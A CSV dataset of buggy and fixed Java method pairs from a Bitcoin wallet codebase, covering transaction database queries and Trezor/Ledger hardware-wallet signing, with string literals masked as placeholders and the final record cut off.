record_number,buggy_code,fixed_code
91001,"@Override public Collection<TransactionEx> getUnconfirmedTransactions(){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{});
    while (cursor.moveToNext()) {
      TransactionEx tex=new TransactionEx(new Sha256Hash(cursor.getBlob(0)),-1,cursor.getInt(1),cursor.getBlob(2));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}","@Override public Collection<TransactionEx> getUnconfirmedTransactions(){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{});
    while (cursor.moveToNext()) {
      Sha256Hash txid=new Sha256Hash(cursor.getBlob(0));
      TransactionEx tex=new TransactionEx(txid,txid,-1,cursor.getInt(1),cursor.getBlob(2));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}"
91002,"@Override public Transaction getSignedTransaction(UnsignedTransaction unsigned,Bip44AccountExternalSignature forAccount){
  if (!initialize()) {
    return null;
  }
  setState(Status.readyToScan,currentAccountState);
  SignTx signTx=SignTx.newBuilder().setCoinName(getNetwork().getCoinName()).setInputsCount(unsigned.getFundingOutputs().length).setOutputsCount(unsigned.getOutputs().length).build();
  Message response;
  try {
    response=getSignatureDevice().send(signTx);
  }
 catch (  ExtSigDeviceConnectionException ex) {
    postErrorMessage(ex.getMessage());
    return null;
  }
  SigningRequest[] signatureInfo=unsigned.getSignatureInfo();
  ByteWriter signedTx=new ByteWriter(1024);
  while (true) {
    try {
      response=filterMessages(response);
    }
 catch (    ExtSigDeviceConnectionException ex) {
      postErrorMessage(ex.getMessage());
      return null;
    }
    if (response == null) {
      return null;
    }
    if (!(response instanceof TxRequest)) {
      Log.e(""String_Node_Str"",""String_Node_Str"" + response.getClass().toString());
      return null;
    }
    TxRequest txRequest=(TxRequest)response;
    if (txRequest.hasSerialized() && txRequest.getSerialized().hasSerializedTx()) {
      signedTx.putBytes(txRequest.getSerialized().getSerializedTx().toByteArray());
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXFINISHED) {
      break;
    }
    TrezorType.TxRequestDetailsType txRequestDetailsType=txRequest.getDetails();
    Log.d(""String_Node_Str"",""String_Node_Str"" + txRequest.getRequestType().toString());
    Transaction currentTx;
    if (txRequestDetailsType.hasTxHash()) {
      Sha256Hash requestHash=Sha256Hash.of(txRequestDetailsType.getTxHash().toByteArray());
      currentTx=TransactionEx.toTransaction(forAccount.getTransaction(requestHash));
    }
 else {
      currentTx=Transaction.fromUnsignedTransaction(unsigned);
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXMETA) {
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().setInputsCnt(currentTx.inputs.length).setOutputsCnt(currentTx.outputs.length).setVersion(currentTx.version).setLockTime(currentTx.lockTime).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXINPUT) {
      TransactionInput ak_input=currentTx.inputs[txRequestDetailsType.getRequestIndex()];
      ByteString prevHash=ByteString.copyFrom(ak_input.outPoint.hash.getBytes());
      ByteString scriptSig=ByteString.copyFrom(ak_input.script.getScriptBytes());
      TrezorType.TxInputType.Builder txInputBuilder=TrezorType.TxInputType.newBuilder().setPrevHash(prevHash).setPrevIndex(ak_input.outPoint.index).setSequence(ak_input.sequence).setScriptSig(scriptSig);
      if (!txRequestDetailsType.hasTxHash()) {
        SigningRequest signingRequest=signatureInfo[txRequestDetailsType.getRequestIndex()];
        Address toSignWith=signingRequest.publicKey.toAddress(getNetwork());
        if (toSignWith != null) {
          Optional<Integer[]> addId=forAccount.getAddressId(toSignWith);
          if (addId.isPresent()) {
            new InputAddressSetter(txInputBuilder).setAddressN(forAccount.getAccountIndex(),addId.get());
          }
        }
 else {
          Log.w(""String_Node_Str"",""String_Node_Str"" + txRequestDetailsType.getRequestIndex());
        }
      }
      TrezorType.TxInputType txInput=txInputBuilder.build();
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().addInputs(txInput).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXOUTPUT) {
      TransactionOutput ak_output=currentTx.outputs[txRequestDetailsType.getRequestIndex()];
      TrezorType.TransactionType txType;
      if (txRequestDetailsType.hasTxHash()) {
        ByteString scriptPubKey=ByteString.copyFrom(ak_output.script.getScriptBytes());
        TrezorType.TxOutputBinType txOutput=TrezorType.TxOutputBinType.newBuilder().setScriptPubkey(scriptPubKey).setAmount(ak_output.value).build();
        txType=TrezorType.TransactionType.newBuilder().addBinOutputs(txOutput).build();
      }
 else {
        Address address=ak_output.script.getAddress(getNetwork());
        TrezorType.TxOutputType.Builder txOutput=TrezorType.TxOutputType.newBuilder().setAmount(ak_output.value).setScriptType(mapScriptType(ak_output.script));
        Optional<Integer[]> addId=forAccount.getAddressId(address);
        if (addId.isPresent() && addId.get()[0] == 1) {
          new OutputAddressSetter(txOutput).setAddressN(forAccount.getAccountIndex(),addId.get());
        }
 else {
          txOutput.setAddress(address.toString());
        }
        txType=TrezorType.TransactionType.newBuilder().addOutputs(txOutput.build()).build();
      }
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
  }
  Transaction ret;
  try {
    ret=Transaction.fromByteReader(new ByteReader(signedTx.toBytes()));
    checkSignedTransaction(unsigned,signedTx);
  }
 catch (  Transaction.TransactionParsingException e) {
    postErrorMessage(""String_Node_Str"");
    Log.e(""String_Node_Str"",""String_Node_Str"" + e.getMessage(),e);
    return null;
  }
catch (  ScriptException e) {
    postErrorMessage(""String_Node_Str"");
    Log.e(TAG,""String_Node_Str"",e);
    return null;
  }
  return ret;
}","@Override public Transaction getSignedTransaction(UnsignedTransaction unsigned,Bip44AccountExternalSignature forAccount){
  if (!initialize()) {
    return null;
  }
  setState(Status.readyToScan,currentAccountState);
  SignTx signTx=SignTx.newBuilder().setCoinName(getNetwork().getCoinName()).setInputsCount(unsigned.getFundingOutputs().length).setOutputsCount(unsigned.getOutputs().length).build();
  Message response;
  try {
    response=getSignatureDevice().send(signTx);
  }
 catch (  ExtSigDeviceConnectionException ex) {
    postErrorMessage(ex.getMessage());
    return null;
  }
  SigningRequest[] signatureInfo=unsigned.getSignatureInfo();
  ByteWriter signedTx=new ByteWriter(1024);
  while (true) {
    try {
      response=filterMessages(response);
    }
 catch (    ExtSigDeviceConnectionException ex) {
      postErrorMessage(ex.getMessage());
      return null;
    }
    if (response == null) {
      return null;
    }
    if (!(response instanceof TxRequest)) {
      Log.e(""String_Node_Str"",""String_Node_Str"" + response.getClass().toString());
      return null;
    }
    TxRequest txRequest=(TxRequest)response;
    if (txRequest.hasSerialized() && txRequest.getSerialized().hasSerializedTx()) {
      signedTx.putBytes(txRequest.getSerialized().getSerializedTx().toByteArray());
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXFINISHED) {
      break;
    }
    TrezorType.TxRequestDetailsType txRequestDetailsType=txRequest.getDetails();
    Log.d(""String_Node_Str"",""String_Node_Str"" + txRequest.getRequestType().toString());
    Transaction currentTx;
    if (txRequestDetailsType.hasTxHash()) {
      Sha256Hash requestHash=Sha256Hash.of(txRequestDetailsType.getTxHash().toByteArray());
      currentTx=TransactionEx.toTransaction(forAccount.getTransaction(requestHash));
    }
 else {
      currentTx=Transaction.fromUnsignedTransaction(unsigned);
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXMETA) {
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().setInputsCnt(currentTx.inputs.length).setOutputsCnt(currentTx.outputs.length).setVersion(currentTx.version).setLockTime(currentTx.lockTime).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXINPUT) {
      TransactionInput ak_input=currentTx.inputs[txRequestDetailsType.getRequestIndex()];
      ByteString prevHash=ByteString.copyFrom(ak_input.outPoint.txid.getBytes());
      ByteString scriptSig=ByteString.copyFrom(ak_input.script.getScriptBytes());
      TrezorType.TxInputType.Builder txInputBuilder=TrezorType.TxInputType.newBuilder().setPrevHash(prevHash).setPrevIndex(ak_input.outPoint.index).setSequence(ak_input.sequence).setScriptSig(scriptSig);
      if (!txRequestDetailsType.hasTxHash()) {
        SigningRequest signingRequest=signatureInfo[txRequestDetailsType.getRequestIndex()];
        Address toSignWith=signingRequest.publicKey.toAddress(getNetwork());
        if (toSignWith != null) {
          Optional<Integer[]> addId=forAccount.getAddressId(toSignWith);
          if (addId.isPresent()) {
            new InputAddressSetter(txInputBuilder).setAddressN(forAccount.getAccountIndex(),addId.get());
          }
        }
 else {
          Log.w(""String_Node_Str"",""String_Node_Str"" + txRequestDetailsType.getRequestIndex());
        }
      }
      TrezorType.TxInputType txInput=txInputBuilder.build();
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().addInputs(txInput).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXOUTPUT) {
      TransactionOutput ak_output=currentTx.outputs[txRequestDetailsType.getRequestIndex()];
      TrezorType.TransactionType txType;
      if (txRequestDetailsType.hasTxHash()) {
        ByteString scriptPubKey=ByteString.copyFrom(ak_output.script.getScriptBytes());
        TrezorType.TxOutputBinType txOutput=TrezorType.TxOutputBinType.newBuilder().setScriptPubkey(scriptPubKey).setAmount(ak_output.value).build();
        txType=TrezorType.TransactionType.newBuilder().addBinOutputs(txOutput).build();
      }
 else {
        Address address=ak_output.script.getAddress(getNetwork());
        TrezorType.TxOutputType.Builder txOutput=TrezorType.TxOutputType.newBuilder().setAmount(ak_output.value).setScriptType(mapScriptType(ak_output.script));
        Optional<Integer[]> addId=forAccount.getAddressId(address);
        if (addId.isPresent() && addId.get()[0] == 1) {
          new OutputAddressSetter(txOutput).setAddressN(forAccount.getAccountIndex(),addId.get());
        }
 else {
          txOutput.setAddress(address.toString());
        }
        txType=TrezorType.TransactionType.newBuilder().addOutputs(txOutput.build()).build();
      }
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
  }
  Transaction ret;
  try {
    ret=Transaction.fromByteReader(new ByteReader(signedTx.toBytes()));
    checkSignedTransaction(unsigned,signedTx);
  }
 catch (  Transaction.TransactionParsingException e) {
    postErrorMessage(""String_Node_Str"");
    Log.e(""String_Node_Str"",""String_Node_Str"" + e.getMessage(),e);
    return null;
  }
catch (  ScriptException e) {
    postErrorMessage(""String_Node_Str"");
    Log.e(TAG,""String_Node_Str"",e);
    return null;
  }
  return ret;
}"
91003,"private Transaction signInternal(UnsignedTransaction unsigned,Bip44AccountExternalSignature forAccount) throws BTChipException, TransactionOutputParsingException {
  Transaction unsignedtx;
  BTChipDongle.BTChipInput inputs[];
  Vector<byte[]> signatures;
  String outputAddress=null, amount, fees, commonPath, changePath=""String_Node_Str"";
  long totalSending=0;
  StandardTransactionBuilder.SigningRequest[] signatureInfo;
  String txpin=""String_Node_Str"";
  BTChipDongle.BTChipOutput outputData=null;
  ByteWriter rawOutputsWriter=new ByteWriter(1024);
  byte[] rawOutputs;
  if (!initialize()) {
    postErrorMessage(""String_Node_Str"");
    return null;
  }
  boolean isTEE=isTee();
  setState(Status.readyToScan,currentAccountState);
  if (isTEE) {
    try {
      int attempts=dongle.getVerifyPinRemainingAttempts();
      if (attempts == 0) {
        postErrorMessage(""String_Node_Str"");
        return null;
      }
    }
 catch (    BTChipException e) {
      if (e.getSW() == SW_CONDITIONS_NOT_SATISFIED) {
        postErrorMessage(""String_Node_Str"");
        return null;
      }
      if (e.getSW() == SW_HALTED) {
        LedgerTransportTEEProxy proxy=(LedgerTransportTEEProxy)getTransport().getTransport();
        try {
          proxy.close();
          proxy.init();
          int attempts=dongle.getVerifyPinRemainingAttempts();
          if (attempts == 0) {
            postErrorMessage(""String_Node_Str"");
            return null;
          }
        }
 catch (        BTChipException e1) {
          if (e1.getSW() == SW_CONDITIONS_NOT_SATISFIED) {
            postErrorMessage(""String_Node_Str"");
            return null;
          }
        }
catch (        Exception ignore) {
        }
      }
    }
  }
  signatureInfo=unsigned.getSignatureInfo();
  unsignedtx=Transaction.fromUnsignedTransaction(unsigned);
  inputs=new BTChipDongle.BTChipInput[unsignedtx.inputs.length];
  signatures=new Vector<byte[]>(unsignedtx.inputs.length);
  rawOutputsWriter.putCompactInt(unsigned.getOutputs().length);
  commonPath=""String_Node_Str"" + getNetwork().getBip44CoinType().getLastIndex() + ""String_Node_Str""+ forAccount.getAccountIndex()+ ""String_Node_Str"";
  for (  TransactionOutput o : unsigned.getOutputs()) {
    Address toAddress;
    o.toByteWriter(rawOutputsWriter);
    toAddress=o.script.getAddress(getNetwork());
    Optional<Integer[]> addressId=forAccount.getAddressId(toAddress);
    if (!(addressId.isPresent() && addressId.get()[0] == 1)) {
      totalSending+=o.value;
      outputAddress=toAddress.toString();
    }
 else {
      changePath=commonPath + addressId.get()[0] + ""String_Node_Str""+ addressId.get()[1];
    }
  }
  rawOutputs=rawOutputsWriter.toBytes();
  amount=CoinUtil.valueString(totalSending,false);
  fees=CoinUtil.valueString(unsigned.calculateFee(),false);
  for (int i=0; i < unsignedtx.inputs.length; i++) {
    TransactionInput currentInput=unsignedtx.inputs[i];
    Transaction currentTransaction=TransactionEx.toTransaction(forAccount.getTransaction(currentInput.outPoint.hash));
    ByteArrayInputStream bis=new ByteArrayInputStream(currentTransaction.toBytes());
    inputs[i]=dongle.getTrustedInput(new BitcoinTransaction(bis),currentInput.outPoint.index);
  }
  for (int i=0; i < unsignedtx.inputs.length; i++) {
    TransactionInput currentInput=unsignedtx.inputs[i];
    try {
      dongle.startUntrustedTransction(i == 0,i,inputs,currentInput.script.getScriptBytes());
    }
 catch (    BTChipException e) {
      if (e.getSW() == SW_PIN_NEEDED) {
        if (isTEE) {
          try {
            dongle.verifyPin(DUMMY_PIN.getBytes());
          }
 catch (          BTChipException e1) {
            if ((e1.getSW() & 0xfff0) == SW_INVALID_PIN) {
              postErrorMessage(""String_Node_Str"" + (e1.getSW() - SW_INVALID_PIN) + ""String_Node_Str"");
              return null;
            }
          }
 finally {
            LedgerTransportTEEProxy proxy=(LedgerTransportTEEProxy)getTransport().getTransport();
            try {
              byte[] updatedNvm=proxy.requestNVM().get();
              proxy.writeNVM(NVM_IMAGE,updatedNvm);
              proxy.setNVM(updatedNvm);
            }
 catch (            Exception ignore) {
            }
          }
          dongle.startUntrustedTransction(i == 0,i,inputs,currentInput.script.getScriptBytes());
        }
 else {
          mainThreadHandler.post(new Runnable(){
            @Override public void run(){
              eventBus.post(new OnPinRequest());
            }
          }
);
          String pin;
          try {
            pin=pinRequestEntry.take();
          }
 catch (          InterruptedException e1) {
            pin=""String_Node_Str"";
          }
          try {
            Log.d(LOG_TAG,""String_Node_Str"");
            initialize();
            Log.d(LOG_TAG,""String_Node_Str"");
            dongle.verifyPin(pin.getBytes());
            dongle.startUntrustedTransction(i == 0,i,inputs,currentInput.script.getScriptBytes());
          }
 catch (          BTChipException e1) {
            Log.d(LOG_TAG,""String_Node_Str"",e1);
            postErrorMessage(""String_Node_Str"");
            return null;
          }
        }
      }
    }
    mainThreadHandler.post(new Runnable(){
      @Override public void run(){
        eventBus.post(new OnShowTransactionVerification());
      }
    }
);
    outputData=dongle.finalizeInput(rawOutputs,outputAddress,amount,fees,changePath);
    final BTChipDongle.BTChipOutput output=outputData;
    if ((i == 0) && outputData.isConfirmationNeeded()) {
      mainThreadHandler.post(new Runnable(){
        @Override public void run(){
          eventBus.post(new On2FaRequest(output));
        }
      }
);
      try {
        txpin=tx2FaEntry.take();
      }
 catch (      InterruptedException e1) {
        txpin=""String_Node_Str"";
      }
      Log.d(LOG_TAG,""String_Node_Str"");
      initialize();
      Log.d(LOG_TAG,""String_Node_Str"");
      dongle.startUntrustedTransction(false,i,inputs,currentInput.script.getScriptBytes());
      dongle.finalizeInput(rawOutputs,outputAddress,amount,fees,changePath);
    }
    StandardTransactionBuilder.SigningRequest signingRequest=signatureInfo[i];
    Address toSignWith=signingRequest.publicKey.toAddress(getNetwork());
    Optional<Integer[]> addressId=forAccount.getAddressId(toSignWith);
    String keyPath=commonPath + addressId.get()[0] + ""String_Node_Str""+ addressId.get()[1];
    byte[] signature=dongle.untrustedHashSign(keyPath,txpin);
    signatures.add(SignatureUtils.canonicalize(signature,true,0x01));
  }
  if ((unsignedtx.outputs.length == 2) && (outputData.getValue() != null) && (outputData.getValue().length != 0)) {
    TransactionOutput firstOutput=unsignedtx.outputs[0];
    ByteReader byteReader=new ByteReader(outputData.getValue(),1);
    TransactionOutput dongleOutput=TransactionOutput.fromByteReader(byteReader);
    if ((firstOutput.value != dongleOutput.value) || (!Arrays.equals(firstOutput.script.getScriptBytes(),dongleOutput.script.getScriptBytes()))) {
      unsignedtx.outputs[0]=unsignedtx.outputs[1];
      unsignedtx.outputs[1]=firstOutput;
    }
  }
  return StandardTransactionBuilder.finalizeTransaction(unsigned,signatures);
}","private Transaction signInternal(UnsignedTransaction unsigned,Bip44AccountExternalSignature forAccount) throws BTChipException, TransactionOutputParsingException {
  Transaction unsignedtx;
  BTChipDongle.BTChipInput inputs[];
  Vector<byte[]> signatures;
  String outputAddress=null, amount, fees, commonPath, changePath=""String_Node_Str"";
  long totalSending=0;
  StandardTransactionBuilder.SigningRequest[] signatureInfo;
  String txpin=""String_Node_Str"";
  BTChipDongle.BTChipOutput outputData=null;
  ByteWriter rawOutputsWriter=new ByteWriter(1024);
  byte[] rawOutputs;
  if (!initialize()) {
    postErrorMessage(""String_Node_Str"");
    return null;
  }
  boolean isTEE=isTee();
  setState(Status.readyToScan,currentAccountState);
  if (isTEE) {
    try {
      int attempts=dongle.getVerifyPinRemainingAttempts();
      if (attempts == 0) {
        postErrorMessage(""String_Node_Str"");
        return null;
      }
    }
 catch (    BTChipException e) {
      if (e.getSW() == SW_CONDITIONS_NOT_SATISFIED) {
        postErrorMessage(""String_Node_Str"");
        return null;
      }
      if (e.getSW() == SW_HALTED) {
        LedgerTransportTEEProxy proxy=(LedgerTransportTEEProxy)getTransport().getTransport();
        try {
          proxy.close();
          proxy.init();
          int attempts=dongle.getVerifyPinRemainingAttempts();
          if (attempts == 0) {
            postErrorMessage(""String_Node_Str"");
            return null;
          }
        }
 catch (        BTChipException e1) {
          if (e1.getSW() == SW_CONDITIONS_NOT_SATISFIED) {
            postErrorMessage(""String_Node_Str"");
            return null;
          }
        }
catch (        Exception ignore) {
        }
      }
    }
  }
  signatureInfo=unsigned.getSignatureInfo();
  unsignedtx=Transaction.fromUnsignedTransaction(unsigned);
  inputs=new BTChipDongle.BTChipInput[unsignedtx.inputs.length];
  signatures=new Vector<byte[]>(unsignedtx.inputs.length);
  rawOutputsWriter.putCompactInt(unsigned.getOutputs().length);
  commonPath=""String_Node_Str"" + getNetwork().getBip44CoinType().getLastIndex() + ""String_Node_Str""+ forAccount.getAccountIndex()+ ""String_Node_Str"";
  for (  TransactionOutput o : unsigned.getOutputs()) {
    Address toAddress;
    o.toByteWriter(rawOutputsWriter);
    toAddress=o.script.getAddress(getNetwork());
    Optional<Integer[]> addressId=forAccount.getAddressId(toAddress);
    if (!(addressId.isPresent() && addressId.get()[0] == 1)) {
      totalSending+=o.value;
      outputAddress=toAddress.toString();
    }
 else {
      changePath=commonPath + addressId.get()[0] + ""String_Node_Str""+ addressId.get()[1];
    }
  }
  rawOutputs=rawOutputsWriter.toBytes();
  amount=CoinUtil.valueString(totalSending,false);
  fees=CoinUtil.valueString(unsigned.calculateFee(),false);
  for (int i=0; i < unsignedtx.inputs.length; i++) {
    TransactionInput currentInput=unsignedtx.inputs[i];
    Transaction currentTransaction=TransactionEx.toTransaction(forAccount.getTransaction(currentInput.outPoint.txid));
    ByteArrayInputStream bis=new ByteArrayInputStream(currentTransaction.toBytes());
    inputs[i]=dongle.getTrustedInput(new BitcoinTransaction(bis),currentInput.outPoint.index);
  }
  for (int i=0; i < unsignedtx.inputs.length; i++) {
    TransactionInput currentInput=unsignedtx.inputs[i];
    try {
      dongle.startUntrustedTransction(i == 0,i,inputs,currentInput.script.getScriptBytes());
    }
 catch (    BTChipException e) {
      if (e.getSW() == SW_PIN_NEEDED) {
        if (isTEE) {
          try {
            dongle.verifyPin(DUMMY_PIN.getBytes());
          }
 catch (          BTChipException e1) {
            if ((e1.getSW() & 0xfff0) == SW_INVALID_PIN) {
              postErrorMessage(""String_Node_Str"" + (e1.getSW() - SW_INVALID_PIN) + ""String_Node_Str"");
              return null;
            }
          }
 finally {
            LedgerTransportTEEProxy proxy=(LedgerTransportTEEProxy)getTransport().getTransport();
            try {
              byte[] updatedNvm=proxy.requestNVM().get();
              proxy.writeNVM(NVM_IMAGE,updatedNvm);
              proxy.setNVM(updatedNvm);
            }
 catch (            Exception ignore) {
            }
          }
          dongle.startUntrustedTransction(i == 0,i,inputs,currentInput.script.getScriptBytes());
        }
 else {
          mainThreadHandler.post(new Runnable(){
            @Override public void run(){
              eventBus.post(new OnPinRequest());
            }
          }
);
          String pin;
          try {
            pin=pinRequestEntry.take();
          }
 catch (          InterruptedException e1) {
            pin=""String_Node_Str"";
          }
          try {
            Log.d(LOG_TAG,""String_Node_Str"");
            initialize();
            Log.d(LOG_TAG,""String_Node_Str"");
            dongle.verifyPin(pin.getBytes());
            dongle.startUntrustedTransction(i == 0,i,inputs,currentInput.script.getScriptBytes());
          }
 catch (          BTChipException e1) {
            Log.d(LOG_TAG,""String_Node_Str"",e1);
            postErrorMessage(""String_Node_Str"");
            return null;
          }
        }
      }
    }
    mainThreadHandler.post(new Runnable(){
      @Override public void run(){
        eventBus.post(new OnShowTransactionVerification());
      }
    }
);
    outputData=dongle.finalizeInput(rawOutputs,outputAddress,amount,fees,changePath);
    final BTChipDongle.BTChipOutput output=outputData;
    if ((i == 0) && outputData.isConfirmationNeeded()) {
      mainThreadHandler.post(new Runnable(){
        @Override public void run(){
          eventBus.post(new On2FaRequest(output));
        }
      }
);
      try {
        txpin=tx2FaEntry.take();
      }
 catch (      InterruptedException e1) {
        txpin=""String_Node_Str"";
      }
      Log.d(LOG_TAG,""String_Node_Str"");
      initialize();
      Log.d(LOG_TAG,""String_Node_Str"");
      dongle.startUntrustedTransction(false,i,inputs,currentInput.script.getScriptBytes());
      dongle.finalizeInput(rawOutputs,outputAddress,amount,fees,changePath);
    }
    StandardTransactionBuilder.SigningRequest signingRequest=signatureInfo[i];
    Address toSignWith=signingRequest.publicKey.toAddress(getNetwork());
    Optional<Integer[]> addressId=forAccount.getAddressId(toSignWith);
    String keyPath=commonPath + addressId.get()[0] + ""String_Node_Str""+ addressId.get()[1];
    byte[] signature=dongle.untrustedHashSign(keyPath,txpin);
    signatures.add(SignatureUtils.canonicalize(signature,true,0x01));
  }
  if ((unsignedtx.outputs.length == 2) && (outputData.getValue() != null) && (outputData.getValue().length != 0)) {
    TransactionOutput firstOutput=unsignedtx.outputs[0];
    ByteReader byteReader=new ByteReader(outputData.getValue(),1);
    TransactionOutput dongleOutput=TransactionOutput.fromByteReader(byteReader);
    if ((firstOutput.value != dongleOutput.value) || (!Arrays.equals(firstOutput.script.getScriptBytes(),dongleOutput.script.getScriptBytes()))) {
      unsignedtx.outputs[0]=unsignedtx.outputs[1];
      unsignedtx.outputs[1]=firstOutput;
    }
  }
  return StandardTransactionBuilder.finalizeTransaction(unsigned,signatures);
}"
91004,"public static byte[] outPointToBytes(OutPoint outPoint){
  byte[] bytes=new byte[34];
  System.arraycopy(outPoint.hash.getBytes(),0,bytes,0,Sha256Hash.HASH_LENGTH);
  bytes[32]=(byte)(outPoint.index & 0xFF);
  bytes[33]=(byte)((outPoint.index >> 8) & 0xFF);
  return bytes;
}","public static byte[] outPointToBytes(OutPoint outPoint){
  byte[] bytes=new byte[34];
  System.arraycopy(outPoint.txid.getBytes(),0,bytes,0,Sha256Hash.HASH_LENGTH);
  bytes[32]=(byte)(outPoint.index & 0xFF);
  bytes[33]=(byte)((outPoint.index >> 8) & 0xFF);
  return bytes;
}"
91005,"@Override public List<TransactionEx> getTransactionHistory(int offset,int limit){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{Integer.toString(limit),Integer.toString(offset)});
    while (cursor.moveToNext()) {
      TransactionEx tex=new TransactionEx(new Sha256Hash(cursor.getBlob(0)),cursor.getInt(1),cursor.getInt(2),cursor.getBlob(3));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}","@Override public List<TransactionEx> getTransactionHistory(int offset,int limit){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{Integer.toString(limit),Integer.toString(offset)});
    while (cursor.moveToNext()) {
      Sha256Hash txid=new Sha256Hash(cursor.getBlob(0));
      TransactionEx tex=new TransactionEx(txid,txid,cursor.getInt(1),cursor.getInt(2),cursor.getBlob(3));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}"
91006,"private void putReferencedOutputs(byte[] rawTx){
  try {
    final Transaction transaction=Transaction.fromBytes(rawTx);
    final List<OutPoint> refersOutpoint=new ArrayList<>();
    for (    TransactionInput input : transaction.inputs) {
      refersOutpoint.add(input.outPoint);
    }
    putTxRefersParentTransaction(transaction.getHash(),refersOutpoint);
  }
 catch (  Transaction.TransactionParsingException e) {
    Log.w(LOG_TAG,""String_Node_Str"" + e.getMessage());
  }
}","private void putReferencedOutputs(byte[] rawTx){
  try {
    final Transaction transaction=Transaction.fromBytes(rawTx);
    final List<OutPoint> refersOutpoint=new ArrayList<>();
    for (    TransactionInput input : transaction.inputs) {
      refersOutpoint.add(input.outPoint);
    }
    putTxRefersParentTransaction(transaction.getId(),refersOutpoint);
  }
 catch (  Transaction.TransactionParsingException e) {
    Log.w(LOG_TAG,""String_Node_Str"" + e.getMessage());
  }
}"
91007,"@Override public Collection<TransactionEx> getYoungTransactions(int maxConfirmations,int blockChainHeight){
  int maxHeight=blockChainHeight - maxConfirmations + 1;
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{Integer.toString(maxHeight)});
    while (cursor.moveToNext()) {
      int height=cursor.getInt(1);
      if (height == Integer.MAX_VALUE) {
        height=-1;
      }
      TransactionEx tex=new TransactionEx(new Sha256Hash(cursor.getBlob(0)),height,cursor.getInt(2),cursor.getBlob(3));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}","@Override public Collection<TransactionEx> getYoungTransactions(int maxConfirmations,int blockChainHeight){
  int maxHeight=blockChainHeight - maxConfirmations + 1;
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str"",new String[]{Integer.toString(maxHeight)});
    while (cursor.moveToNext()) {
      int height=cursor.getInt(1);
      if (height == Integer.MAX_VALUE) {
        height=-1;
      }
      Sha256Hash txid=new Sha256Hash(cursor.getBlob(0));
      TransactionEx tex=new TransactionEx(txid,txid,height,cursor.getInt(2),cursor.getBlob(3));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}"
91008,"@Override public List<TransactionEx> getTransactionsSince(long since){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str""+ ""String_Node_Str"",new String[]{Long.toString(since / 1000)});
    while (cursor.moveToNext()) {
      TransactionEx tex=new TransactionEx(new Sha256Hash(cursor.getBlob(0)),cursor.getInt(1),cursor.getInt(2),cursor.getBlob(3));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}","@Override public List<TransactionEx> getTransactionsSince(long since){
  Cursor cursor=null;
  List<TransactionEx> list=new LinkedList<>();
  try {
    cursor=_db.rawQuery(""String_Node_Str"" + txTableName + ""String_Node_Str""+ ""String_Node_Str"",new String[]{Long.toString(since / 1000)});
    while (cursor.moveToNext()) {
      Sha256Hash txid=new Sha256Hash(cursor.getBlob(0));
      TransactionEx tex=new TransactionEx(txid,txid,cursor.getInt(1),cursor.getInt(2),cursor.getBlob(3));
      list.add(tex);
    }
    return list;
  }
  finally {
    if (cursor != null) {
      cursor.close();
    }
  }
}"
91009,"@Override public TransactionEx getTransaction(Sha256Hash hash){
  Cursor cursor=null;
  try {
    SQLiteQueryWithBlobs blobQuery=new SQLiteQueryWithBlobs(_db);
    blobQuery.bindBlob(1,hash.getBytes());
    cursor=blobQuery.query(false,txTableName,new String[]{""String_Node_Str"",""String_Node_Str"",""String_Node_Str""},""String_Node_Str"",null,null,null,null,null);
    if (cursor.moveToNext()) {
      int height=cursor.getInt(0);
      if (height == Integer.MAX_VALUE) {
        height=-1;
      }
